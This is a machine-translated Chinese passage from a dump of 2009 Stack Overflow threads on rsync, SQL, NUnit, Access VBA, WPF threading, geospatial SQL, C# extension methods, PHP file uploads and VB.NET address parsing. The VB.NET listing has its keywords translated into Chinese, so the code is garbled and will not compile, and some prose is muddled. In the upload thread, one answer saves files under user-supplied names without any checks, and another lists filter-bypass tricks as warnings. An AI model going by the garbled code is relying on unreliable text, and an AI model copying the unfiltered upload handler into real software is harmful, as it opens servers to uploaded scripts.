我会为此寻找什么？有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T19:43:51.803

使用 javascript 捕获 mousemove，获取 x 和 y 坐标，然后使用距离公式确定最接近 div 的线。

# linux - rsync 模块路径需要是主目录

> ID：651843
> 
> 赞同：0
> 
> 时间：2009-03-16T19:34:59.810
> 
> 标签：linux, rsync

我正在尝试使用 rsync 将 windows 服务器备份到 rsync 服务器。我在 linux 端遇到了 rsync 的问题，它不喜欢符号链接。

目前我正在尝试使用 的模块路径`~/backup`，但 rsync 说 chroot 失败。我查找了要做什么，发现我需要添加选项`use chroot = no`和`munge symlinks = no`. 这修复了`@ERROR: chroot failed`但现在它告诉我`@ERROR: chdir failed`并且日志文件说没有 ~/backup 目录。我知道我正在验证的用户在他的目录中有一个备份文件夹。

我怎样才能解决这个问题？

作为参考，我使用了一个名为 NetSync 的 .NET rsync 端口，并通过使用 granados 生成的端口转发 SSH 连接对其进行隧道传输。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T22:04:09.453

IIRC，波浪号（〜）扩展由外壳完成。chdir() 不处理这个。

尝试绝对路径。如果您不喜欢这样，请尝试使用“备份”（或 ./backup），假设登录后，当前目录将设置为用户的主目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-12T20:52:03.643

这有点太晚了，但是如果目录不存在，chroot 会失败。您是否检查了 ~/backup 是否已实际创建？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2011-08-01T16:20:54.270

据我了解，您的路径似乎应该是/home，并且由您的用户移动到他自己的目录。

还有另一种解决方案涉及为每个用户声明一个模块，但这似乎过于复杂。

# sql - 如何一对多删除FK？

> ID：651847
> 
> 赞同：0
> 
> 时间：2009-03-16T19:35:57.827
> 
> 标签：sql, asp.net-membership

我有一个表（aspnet_Membership），其中包含我需要删除的垃圾邮件记录。有一些外键，我正在尝试编写一个简单的 SQL 语句来删除 FK，这样我就可以删除主记录。

因此，有一个名为“aspnet_UsersInRoles”的表，它具有 UserID 和 RoleID，在我的“aspnet_Membership”表中是 UserID。我不能在不孤立记录的情况下删除用户（由于限制，无论如何我都不会这样做）。

我如何才能基本上运行以下内容：

```
'delete from 'aspnet_UsersInRoles' where UserID in 'aspnet_Membership' and 'aspnet_Membership.CreateDate >= '03/15/2009'? 
```

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T19:42:45.563

好吧，您可能已经设置了外键来执行级联删除，这样您就不必担心它，但是您在查询中的尝试非常接近可行的方法，只需使用子查询：

```
DELETE FROM aspnet_UsersInRoles WHERE UserID IN (SELECT UserID FROM aspnet_Membership WHERE aspnet_Membership.CreateDate >= '03/15/2009') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-16T19:40:59.377

您可以在删除时更改约束以进行级联： [链接](http://www.mssqltips.com/tip.asp?tip=1296)

否则，您可以查看 sys.foreign_keys 表以使用主键获取所有外键并自动生成 sql 以首先在那里进行删除。

# nunit - 有没有办法在一个 nunit 项目文件中指定多个应用程序配置文件？

> ID：651853
> 
> 赞同：8
> 
> 时间：2009-03-16T19:37:17.637
> 
> 标签：nunit

我有一组单元测试，我需要从一个命令行调用全部运行。其中一个程序集使用与其余程序集不同的配置文件。有没有办法在一个 nunit 项目文件中指定多个应用程序配置文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-12-19T11:04:15.997

不在项目文件中，但您可以为每个程序集指定一个配置文件（例如 TestAssembly1.dll.config）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-12-18T20:14:33.243

我会说，当您编写运行测试的脚本时，您重命名正确的 app.config 以替换另一个，以便在您的测试开始时加载正确的 app.config。如果您需要一个如何做到这一点的例子，请告诉我。

# ms-access - 在 VBA 中，如何使用工具 --> Office 链接 --> 使用 Microsoft Office Excel 分析

> ID：651855
> 
> 赞同：1
> 
> 时间：2009-03-16T19:38:42.923
> 
> 标签：ms-access, vba, export-to-excel

我正在尝试以不继承排序和分组的方式将查询从 MS Access 导出到 MS Excel。我注意到此功能只需打开查询并单击即可使用：

> 工具 --> Office 链接 --> 使用 Microsoft Office Excel 分析

但是，我不知道如何使用 VBA 以编程方式使用 MS Access 的此功能。

我打算尝试这样的事情：

```
 DoCmd.OpenQuery "QueryName", acViewNormal, acReadOnly
 DoCmd.AnalyseFeatureFunctionHere 
```

或者

```
 DoCmd.OpenQuery "QueryName", acViewNormal, acReadOnly
 SysCmd(acAnalyseFeatureFunctionHere) 
```

或者

```
 DoCmd.OpenQuery "QueryName", acViewNormal, acReadOnly
 Application.AnalyseFeatureFunctionHere 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T19:43:37.590

CommandBars("Menu Bar").Controls("Tools").Controls("Office Links").Controls("Analyze It With Microsoft Office Excel").accDoDefaultAction

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-16T21:31:43.667

可以使用 Run Command 运行菜单命令，例如输出到 Excel，您可以使用：

```
DoCmd.RunCommand acCmdOutputToExcel 
```

但是，使用 OutputTo 或 TransferSpreadsheet 会更常见。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-03-16T19:41:24.880

在最坏的情况下，您可以使用 SendKeys 发送适当的按键...虽然这可能并不理想，但您将无法（轻松）判断操作何时完成。

# c# - WPF应用程序循环，如何不让整个应用程序冻结？

> ID：651857
> 
> 赞同：2
> 
> 时间：2009-03-16T19:39:38.427
> 
> 标签：c#, .net, wpf, multithreading

我玩 WPF 很开心，但遇到了问题。我用谷歌搜索发现这个[网站](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/878ea631-c76e-49e8-9e25-81e76a3c4fe3/)和我有同样的问题，但没有任何可行的解决方案。

问题是我有一个按钮可以对数据进行一些处理（大约 30 秒）。我想让按钮禁用并在文本框中写入日志......问题是它不会禁用并且在处理完全完成之前它不会在文本框上写任何东西。

任何的想法？

```
 private void button1_Click(object sender, RoutedEventArgs e)
 {
        this.button1.IsEnabled = false;
        //Long stuff here
         txtLog.AppendText(Environment.NewLine + "Blabla");
        //End long stuff here
        this.button1.IsEnabled = true;
 } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-16T20:09:17.810

正如其他人所说，使用[`BackgroundWorker`](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)异步工作的或其他一些方法。

您可以在 your 下声明它，在事件`Window`之类的地方对其进行初始化`Loaded`，然后在事件中使用它`Click`。这是您的方法，修改为 use `BackgroundWorker`，假设您已在`Window`as下声明它`_bw`：

```
private void Window_Loaded(object sender, RoutedEventArgs e)
{
    _bw = new BackgroundWorker();
    _bw.DoWork += new DoWorkEventHandler((o, args) =>
    {
        //Long stuff here       
        this.Dispatcher.Invoke((Action)(() => txtLog.AppendText(Environment.NewLine + "Blabla")));
    });

    _bw.RunWorkerCompleted += new RunWorkerCompletedEventHandler((o, args) =>
    {
        //End long stuff here
        this.Dispatcher.Invoke((Action)(() => this.button1.IsEnabled = true));
    });
}

private void button1_Click(object sender, RoutedEventArgs e)
{
    this.button1.IsEnabled = false;

    _bw.RunWorkerAsync();
} 
```

请注意，任何从另一个线程修改 UI 的操作都必须在[`Dispatcher.Invoke`](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher.invoke.aspx)or[`Dispatcher.BeginInvoke`](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher.begininvoke.aspx)调用中完成，WPF 不允许您`DependencyProperty`从任何线程获取或设置值，但创建对象的线程除外（更多信息请参见[此处](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcherobject.checkaccess.aspx)）。

如果您想读取`txtLog`而不是修改它，代码将是相同的：

```
//Long stuff here       
this.Dispatcher.Invoke((Action)(() => 
{
    string myLogText = txtLog.Text;
    myLogText = myLogText + Environment.NewLine + "Blabla";
    txtLog.Text = myLogText;
})); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-16T19:40:22.543

异步执行。创建一个后台工作进程来处理数据，应用程序将继续响应。[类的 MSDN 资源](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)。由于 WPF 使用 C#（或 VB.net），您仍然可以使用相同类型的线程对象。我自己在 WPF 应用程序中成功使用了后台工作程序。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T19:41:34.053

该操作正在 UI 线程上执行。这意味着它将阻止 Windows 消息泵处理，直到它完成。没有泵 = 没有 UI 更新。您应该在另一个线程上启动该作业。我不知道 WPF，但在 C# 中我会使用 Thread 或[BackgroundWorker](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)类。

# sql - 所有 SQL 地理空间实现都是特定于数据库的吗？

> ID：651883
> 
> 赞同：6
> 
> 时间：2009-03-16T19:46:47.927
> 
> 标签：sql, tsql, geospatial, ansi-sql

我的团队正在研究不同数据库平台提供的地理空间功能。

是否所有实现都是数据库特定的，或者是否有 ANSI SQL 标准或类似类型的标准，正在提供或将在未来提供？

我问，因为我希望实现的代码尽可能与数据库无关（我们的项目是按照 ANSI SQL 标准编写的）。

将来是否有任何已知的将此功能标准化的计划？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T20:09:42.223

例如[，MySQL](http://dev.mysql.com/doc/refman/5.1/en/gis-introduction.html)和[PostgreSQL](http://postgis.refractions.net/)的 GIS 扩展都遵循[OpenGIS“SQL 的简单功能规范”](http://www.opengeospatial.org/standards/sfs)标准。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-30T13:52:33.810

我还没有尝试过，但 Google 告诉我[FDO](http://fdo.osgeo.org/)是“一个用于操作、定义和分析地理空间信息的开源 API，无论它存储在哪里”。它在 osgeo.org 上列出——我认为这对它有利。

有 MySQL 和 Oracle 的供应商。令人失望的是 SQL Server 和 Postgis 并未列在 FDO[提供程序页面上](http://fdo.osgeo.org/OSProviderOverviews.html)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2010-01-25T23:15:43.220

目前，空间数据库的流行专有和开源实现遵循不止一种规范：

*   [OpenGIS - SQL 的简单功能](http://www.opengeospatial.org/standards/sfs/)
*   ISO SQL 空间多媒体规范 - [ISO/IEC 13249-3:2006](http://www.iso.org/iso/catalogue_detail.htm?csnumber=38651) - 信息技术 - 数据库语言 - SQL 多媒体和应用程序包 - 第 3 部分：空间

PostGIS、Oracle、Microsoft SQL Server 和一定程度的 MySQL，所有数据库都实现了标准接口来操作空间数据。然而，尽管有这些相当标准化的功能，但所有数据库通常在简单的 SQL 级别上有所不同，这可能会使您的解决方案的与数据库无关的实现变得棘手。您可能需要调查您感兴趣的功能并比较不同供应商提供的功能。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-16T20:00:01.593

我知道的唯一标准是[http://www.opengeospatial.org/standards/sfs](http://www.opengeospatial.org/standards/sfs)，我不知道所有空间数据库扩展如何实现它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T20:33:48.033

有许多地理数据库可以通过[休眠空间访问](http://www.hibernatespatial.org/)

*   Oracle10g
*   PostgreSQL
*   MySQL

无论如何，如果您打算编写一个与数据库无关的应用程序，那么使用像 hibernate 这样的抽象层是一个好主意。hibernatespatial 填补了地理特征的这一空白。

# .net - 随着扩展方法的出现，抽象类的吸引力是否降低了？

> ID：651884
> 
> 赞同：9
> 
> 时间：2009-03-16T19:46:53.357
> 
> 标签：.net, extension-methods, abstract-class

.NET 中扩展方法的一个有趣方面是您可以将它们应用于接口。对我来说，我可以在接口附近定义功能而不定义使程序集混乱的抽象类似乎很好。

我知道抽象类并没有过时或任何东西，但是您对在代码中使用这种副作用有何感想？

例子：

```
public static class IUserExtensions
{
    public static bool IsCurrentUser(this IUser user)
    {
        return (HttpContext.Current.User != null &&
                HttpContext.Current.User.Identity.Name == user.ID.ToString());
    }
}

public interface IUser {
    int ID { get; set; }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-03-16T20:03:39.320

扩展方法可以让您专注于抽象类实际上应该做什么。在抽象类中实现“实用程序”代码是一种诱惑，因为即使它可能不是逻辑继承树的一部分，实现者也会使用它。扩展方法让您可以将这些实用方法附加到接口，而不会弄乱抽象基类。

**编辑**

具体来说，我会应用这些准则。

遗产

*   如果行为是基类的逻辑行为的一部分，请使用继承
*   如果行为是横切的（适用于对象层次结构之外的事物），则不要使用继承。这些将需要复制。

实用程序类

*   如果行为在逻辑上不属于它所作用的类，请使用实用程序类（静态类）
*   如果实用程序类修改了它所作用的对象的内部状态，则不要使用它们。状态修改应该只保留*给*对象实现层次结构。

扩展方法

*   当扩展方法产生较少摩擦时，请使用与实用程序类相同的决定。如果采用扩展方法感觉不太自然，请不要这样做。
*   请使用扩展方法将实用程序添加到您无法控制的类（如字符串）。
*   当行为被它所扩展的类使用时，不要使用扩展方法。虽然可以做到，但*感觉*做作
*   不要仅仅因为可以就使用扩展方法。*事实上，除非你必须*这样做，否则不要偏离良好的老式 OOP 。然而，当你不得不做的时候，扩展方法是一个相对无用且无害的决定。

**编辑 2**

想到另一个 DO 扩展方法

请使用扩展方法为某些实现提供自然语言（内部 DSL）。这是一个愚蠢的例子。

```
int age = getAge();
if (age.IsDraftAge() && !age.IsLegalDrinkingAge())
{
    Console.WriteLine(@"You cannot drink until your birthdate on {0}.
Join the army instead.",
                      age.GetYearWhenGettingDrunkIsOk());
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T19:53:29.143

我已经多次使用这个功能——事实上，这个功能是专门为装饰接口而不修改它们而创建的，因此是 LINQ。LINQ 的所有优点（至少对对象而言）都基于对 IEnumerable<T> 的扩展方法。

但是，我不认为扩展方法会在您*需要*时以任何方式替换抽象基类。扩展方法不能访问扩展类的私有状态——扩展方法看起来像实例，但仍然是*静态的。*

扩展方法和抽象基类解决了两种不同类型的问题，使用这两种范式的选择不应相互依赖。

因此，我对您的标题问题的回答是：不，扩展方法的存在不会降低抽象基类的吸引力。如果有人认为扩展方法的存在降低了抽象基类的吸引力，那么一开始就没有正确使用抽象基类。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-03-16T20:00:47.207

不，它会减少抽象类的一些误用。

抽象类应该包含子类可以覆盖的默认实现/行为。如果考虑得当，这意味着您可以只覆盖该类的一个行为，并使用其余的默认值。扩展方法提供了与此完全不同的东西。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-03-16T19:53:24.697

我确实喜欢扩展方法，因为它使我能够定义`IList<T>`我一直缺少的 Find(Predicate)、Remove(Predicate) 等。我认为您不能说它们是抽象类的替代品。

我还定义了扩展方法来添加通用行为。我喜欢我在对象或 ToXml 上的 ToJson 扩展方法，非常方便。

我对您的示例的唯一问题是我总是将 IsCurrentUser 视为属性而不是方法，而且我们没有扩展属性。但我在吹毛求疵

它们完全不相关。当我想对其他人将实现或继承的行为进行建模时，我会使用抽象类。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-16T19:52:54.510

不，抽象类的吸引力也不小。抽象类为对象层次结构提供了适当的范例。

*扩展方法只有在您需要*将实例方法添加到已经存在的类但不能直接修改代码时才真正有用。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-03-16T19:59:05.650

扩展方法很好，但您无法将它们或它们的用法与抽象类进行比较。不要忘记[封装](http://en.wikipedia.org/wiki/Encapsulation_%28computer_science%29)是什么，它是 OOP 的支柱之一......

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-16T19:57:07.090

我认为这取决于您的使用-

如果您主要关心的是重构以最小化程序集中的源文件和/或类的数量，那么是的，扩展方法绝对是要走的路，而抽象类最终可能会被更少使用。

然而，对于那些更关心抽象类在*概念上*代表什么的人来说，并没有太大变化。在代码组织上下文中将“public int getCalories()”放在抽象类“Food”中仍然是有意义的，因为吃它的人（使用食物子类的代码）定义有多少是愚蠢的它所含的卡路里。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-03-16T19:58:17.523

一句话：是的。由于抽象类对未来实现的影响很大，一般建议似乎是创建实现接口的抽象类（例如 DBDataReader：IDataReader）。只要方法不需要访问对象的内部状态，我认为没有理由不将其呈现为扩展方法。您无需成本即可获得功能。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-03-16T20:03:42.800

我认为在某些情况下这是一个好主意。Linq 是一个很好的例子，但还有另一个好处：流。

流是抽象类的全部原因是因为它们必须支持 BeginRead、ReadByte 等方法。流可以是一个接口，而所有这些方法都可以是扩展方法。这将使执行诸如从非流类继承和添加流功能之类的事情成为可能，并使添加潜在有用的流方法（如“将流内容转储到内存缓冲区”）（更）自然。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-03-16T20:10:42.800

如果您不需要从扩展方法访问受保护的字段，那么这是 AFAIK 的方法，因为您可以继承多个接口并以这种方式获取所有相关的扩展（而您只能从单个抽象类派生）。

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2009-03-16T19:49:36.220

我没有使用过 .NET 2.0 之后的任何东西，所以我不知道你能做到这一点。对我来说似乎很奇怪；接口不适用于实现。我会觉得这很混乱。此外，您展示的示例是一个类，而不是一个接口。

# visual-studio-2008 - 部分类 - Visual Studio 2008

> ID：651891
> 
> 赞同：4
> 
> 时间：2009-03-16T19:48:30.387
> 
> 标签：visual-studio-2008, partial-classes

是否有可能创建在解决方案资源管理器中分组的部分类，例如 VS 使用类后面的代码（例如*Default.aspx*和 *Default.aspx.cs*）。

我想创建*MyClass.cs*和*MyClass.partial.cs*，它们不应在解决方案资源管理器中显示为 2 个单独的文件。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-03-16T19:54:12.637

我还没有看到在 Visual Studio 本身中执行此操作的方法，但可以通过编辑 .csproj 文件来执行此操作。您需要在 proj 文件中找到要显示在另一个文件下的文件的位置，并将内容设置为要依赖的文件的名称添加一个元素。

例子：

```
<Compile Include="MyFile.g.cs">
    <DependentUpon>MyFile.cs</DependentUpon>
</Compile> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T19:56:01.010

如果您将文件命名为 MyClass.designer.cs，则可以。

有一些“神奇的名字”有效（我认为.xaml.cs 是另一个）。

顺便说一句，我认为部分类不应该用于管理生成的代码之外的任何其他事情。如果您发现自己走这条路是因为在一个文件中要维护的代码太多，那么您应该重新考虑为什么有这么多代码并将其分解为更小的类，就像您无论如何都要分解它一样（我是不是说这是你的情况，但这只是一个建议）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T19:52:20.970

从来没听说过。通常，目的是支持生成的代码（即，您不维护它），因此为此目的，只需将其放在单独的文件夹中即可。

# php - 为 gif/jpg/png/pdf/doc、wmv 文件构建 PHP 上传器，可行，还是我应该买东西？

> ID：651902
> 
> 赞同：3
> 
> 时间：2009-03-16T19:50:05.577
> 
> 标签：php, security, file, upload

我有一个 Mac 服务器，我正在构建 PHP 代码以允许用户上传图像、文档甚至视频文件。研究这个肯定让我很紧张，我希望上传的内容没有病毒。

自己建造东西会是一个巨大的挑战吗？你会这样做，还是会找到一些 OS 或 OTS 产品？（你知道有什么可以推荐的吗）？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2009-03-16T19:54:44.833

从概念上讲，您所说的非常简单。接受和处理上传非常简单，我认为您绝对不需要担心购买预构建的解决方案。

一般来说，图像和视频之类的东西不可能真的有“病毒”（除非查看器应用程序真的很差，并且让它们以某种方式运行代码 - 也称为“Internet Explorer”），但无论如何对它们进行病毒扫描并不难你愿意。只需找到一个可以在服务器上运行的命令行扫描程序（例如[Clam AV](http://en.wikipedia.org/wiki/Clam_AV)），每当上传文件时，通过扫描程序运行它，如果扫描失败则拒绝上传（并记录事件）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-16T20:15:40.383

如果您要上传非常大的文件，您还可以考虑使用 Flash 上传/状态栏，以便用户可以查看上传了多少文件。[SWFUpload](http://swfupload.org/)是一个不错的选择。

您可以通过在 PHP 中执行以下操作来使用 ClamAV 扫描文件：

```
 $out = '';
$int = -1;
exec('/usr/local/bin/clamscan --stdout /path/to/file.ext', $out, $int);

if ($int == 0)
{
  print('No virus!');
}

/*
Return codes from clamscan:
 0 : No virus found.

       1 : Virus(es) found.

       40: Unknown option passed.

       50: Database initialization error.

       52: Not supported file type.

       53: Can't open directory.

       54: Can't open file. (ofm)

       55: Error reading file. (ofm)

       56: Can't stat input file / directory.

       57: Can't get absolute path name of current working directory.

       58: I/O error, please check your file system.

       59: Can't get information about current user from /etc/passwd.

       60: Can't get information about user '' from /etc/passwd.

       61: Can't fork.

       62: Can't initialize logger.

       63: Can't create temporary files/directories (check permissions).

       64: Can't write to temporary directory (please specify another one).

       70: Can't allocate memory (calloc).

       71: Can't allocate memory (malloc).

*/ 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-03-17T05:11:50.487

简短的回答：不要买任何东西。您从自己编写代码中获得的经验和成就感更值得。

长答案：信任任何形式的用户输入通常是一个坏主意。但是，明智地处理用户数据始终是最好的方法。如果你不做傻事*，你会没事的，你会从经验中获益良多。

（*我知道这有点模棱两可，但是，嘿，在你犯错之前尝试识别错误。我知道我很少能做到。;）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-17T08:09:32.853

我现在正在使用来自 digitarald 的 FancyUpload 为 Mootools 1.2.1 构建类似的东西

检查这个例子：[http://localhost/fancyupload/showcase/photoqueue/](http://digitarald.de/project/fancyupload/2-0/showcase/photoqueue/)看看它有多酷。

只需确保您阅读了如何将会话传递给 Flash（使用 GET / POST 参数！您的会话 cookie 将不起作用。）并对文件类型进行一些检查。

就个人而言，我不会让我的用户上传视频。只需使用 youtube 并嵌入这些东西。

哦，是的，如果您想要上传的内容的缩略图，请在您的服务器上安装 ImageMagick 和 Ghostscript。Imagemagick 甚至可以从 PDF 生成缩略图！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-12T01:55:31.793

“我自己建造东西会是一个巨大的挑战吗？” 是的。没有将其外包给第三方解决方案那么大，但是您想要在这里编码的可能是您可以在 php Web 脚本上编码的最危险的事情：允许用户将文件上传到您的服务器。您需要非常小心地过滤您要接受的文件，以防止用户将 php 脚本上传到您的服务器。人们在过滤时常犯的错误是：

1.  根本不过滤。
2.  基于不正确的正则表达式的过滤器很容易绕过。
3.  不使用 is_uploaded_file 和 move_uploaded_file 函数可能会导致 LFI 漏洞。
4.  不使用 $_FILES 数组（改为使用全局变量）可以访问 RFI 漏洞。
5.  根据 $_FILES 数组中的类型进行过滤，因为它来自浏览器，所以可以伪造。
6.  基于服务器端检查的 mime 类型的过滤器，通过模拟魔术文件包含的内容来欺骗（即具有此内容 GIF8 的文件被识别为图像/gif 文件，但完美地作为 php 脚本执行）
7.  将危险文件或扩展名列入黑名单，而不是将明确允许的文件或扩展名列入白名单。
8.  允许上传重新定义 php 可执行扩展名（即 txt）的 .htaccess 文件的 Apache 设置不正确。

我可以继续，但我想你在问之前已经害怕了:)

根据病毒问题，是的，只需运行 AV。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-16T20:00:08.800

这是处理上传文件的代码，只是为了让您明白：

```
foreach ($_FILES as $file) {
  if (!$file['error']) {
    move_uploaded_file ($file['tmp_name'], 'uploads/'. $file['name']);
  } elseif (4 != $file['error']) {
    $error_is = $file['error'];
    // do something with the error :-)
  }
}

header ('Location: ...'); // go to the updated page, like, with the new files
die; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-17T09:51:40.283

您最好使用第三方病毒扫描程序来确保上传没有病毒。（编写自己的代码来检查病毒听起来像是一项艰巨的任务）

示例：我认为 Gmail 使用的是 Norton，而 Yahoo!Mail 我认为使用的是 McAfee。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-29T10:19:45.257

Keith Palmer 建议使用小脚本。

使用**clamdscan**而不是 clamscan。clamdscan 与 setup clamd（clamav 守护程序）通信，而 clamscan 是一个独立的应用程序，因此每次调用它都会加载病毒签名，这可能会在您的服务器上产生相当大的负载。

此外，您还可以尝试 clamuko（这可以让您进行访问扫描），因此您可以将文件放入 clamuko 观察到的目录中。

如果您不能将模块插入内核，还有基于 FUSE 的 ClamFS 可能是更好的解决方案。

# ruby-on-rails - 如何确定一个动作属于哪个控制器？

> ID：651918
> 
> 赞同：1
> 
> 时间：2009-03-16T19:53:26.320
> 
> 标签：ruby-on-rails, model-view-controller, design-patterns

我有两个模型：发布有很多元素，元素属于发布。

我希望定义的操作将所有元素（将它们全部复制）从一个版本导入另一个版本。

如何确定此操作属于发布控制器上的成员操作，还是元素控制器上的集合操作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T20:32:59.033

我会把它放在发布控制器上。现在，如果我能弄清楚我*为什么*要这样做...

我能说的最好的说法是，由于它总是对发布的所有元素进行操作，而不是对单独的或临时的元素子集进行操作，因此它似乎是发布操作而不是元素操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T21:10:55.400

我会将它放入元素控制器中。您正在执行的操作是针对元素而不是针对发布的。这更准确地将您的关注点分开......我想。

# javascript - 仅显示一周的Javascript日期选择器？

> ID：651923
> 
> 赞同：5
> 
> 时间：2009-03-16T19:54:44.070
> 
> 标签：javascript, jquery, datepicker

我正在寻找一个基于 Javascript 的日期选择器，它只允许我显示一周（而不是当前月份）。

理想情况下，它应该是一个可以在必要时扩展到完整月视图并再次返回的视图。

此外，（基于 css 的？）设计可定制性将是一个加分项。

jQuery 解决方案将是首选。我对 jQuery datepicker 进行了简要介绍，但在我看来它只能显示整月。如果我错了，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-16T20:21:28.450

如前所述，jQuery UI 日期选择器不能轻易配置为仅显示一周。但是，您可以使用`maxDate`和`minDate`配置选项来限制用户的输入。这是[此功能的一个示例](http://jqueryui.com/demos/datepicker/#min-max)。

为了回答您的具体问题，我不知道任何只会显示一周的日期选择器控件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T20:10:05.950

我不确定，但也许你可以自定义这个[http://jqueryui.com/demos/datepicker/](http://jqueryui.com/demos/datepicker/)

那些只显示一周的我不知道:(

编辑：经过检查，它显示为基于 CSS，我已经浏览了它的选项，但找不到任何东西来显示一周。而是有一个只允许您选择一周，但不知道假定的效果是什么。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-03-16T20:03:30.460

如果您只有七个选项，那么日期选择器小部件就太过分了。只需使用下拉菜单。一个巧妙的 JavaScript 技巧是，您可以将 1 天添加到任何日期，它会自动处理月/年翻转。以下代码将始终为您提供接下来的 7 天（从今天开始）：

```
var dates = [new Date()];
for (var i = 1; i < 7; i++) dates.push(new Date(dates[0].getYear(), dates[0].getMonth(), dates[0].getDate() + i)); 
```

# vb.net - 正则表达式对服务地址的各个部分进行分类？

> ID：651925
> 
> 赞同：2
> 
> 时间：2009-03-16T19:54:50.387
> 
> 标签：vb.net, regex, parsing

我正在编写的应用程序处理公用事业服务地址，现在我强迫用户知道足够的知识来分离地址的各个部分，并将它们放在适当的字段中，然后再添加到数据库中。必须以这种方式进行排序，因为当地址中有预方向时，直接按字母顺序排序并不总是正确的。例如，现在如果用户想输入服务地址*123 N Main St*，他们将输入为：

*   街道号码 = 123
*   预方向 = N
*   街道名称 = 主要
*   街道类型 = St

我试图通过使用 Split 函数并遍历每个部分来将此地址分成几个部分。到目前为止我所拥有的如下：

```
公共共享函数 ParseServiceAddress（ByVal 地址作为字符串）作为字符串（）
        '这假定一个有效的地址 - 101 N Main St South
        Dim strResult(5) As String '0=st_num, 1=predir, 2=st_name, 3=st_type, 4=postdir
        将 strParts() 调暗为字符串
        暗淡 strSep() As Char = {Char.Parse(" ")}
        将 i 调暗为整数
        将 j 调暗为整数 = 0
        地址 = 地址.Trim()
        strParts = Address.Split(strSep) '使用空格分割
        对于 i = 0 到 strParts.GetUpperBound(0)
            If Integer.TryParse(strParts(i), j) 那么
                '这是一个号码，是门牌号码吗？
                如果 i = 0 那么
                    '我们知道这是门牌号码
                    strResult(0) = strParts(i)
                别的
                    '街道名称的一部分
                    strResult(2) = strResult(2) & " " & strParts(i)
                万一
            别的
                选择案例 strParts(i).ToUpper()
                    案例“TH”、“ND”
                        '知道这是街道名称的一部分
                        strResult(2) = strResult(2) & strParts(i)
                    案例“NORTH”、“SOUTH”、“EAST”、“WEST”、“N”、“S”、“E”、“W”
                        '这是预先指示吗？
                        如果 i = 1 那么
                            strResult(1) = strParts(i)
                        ElseIf i = strParts.GetUpperBound(0) 然后
                            '这是发帖方向
                            strResult(4) = strParts(i)
                        别的
                            '名字的一部分
                            strResult(2) = strResult(2) & strParts(i)
                        万一
                    其他情况
                        如果 i = strParts.GetUpperBound(0) 那么
                            '街道类型
                            strResult(3) = strParts(i)
                        别的
                            '街道名称的一部分
                            strResult(2) = strResult(2) & " " & strResult(i)
                        万一
                结束选择
            万一
        接下来我
        返回字符串结果
    结束功能
```

当给出一个不稳定的地址时，我发现这种方法很麻烦、很慢，甚至完全错误。我想知道我在这里尝试做的是否是正则表达式的一个很好的应用程序？诚然，我以前从未在任何事情中使用过正则表达式，并且在这方面完全是新手。

预先感谢您的任何帮助。:)

**编辑**- 似乎越来越像我需要一个解析器而不仅仅是正则表达式。有谁知道 .NET 中有什么好的地址解析器库？写我们自己的东西现在还不是在卡片上，如果真的到了那一步，就会被搁置一旁。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-16T20:00:54.320

我没有一组可以（轻松）测试的地址，但至少可以尝试一下。它可能在某些地方过于宽松或在其他地方过于严格，但您应该能够对其进行调整。您肯定需要调整前向列表，但您*必须*明确指定这些。此外，请务必将您的正则表达式选项设置为不区分大小写。

```
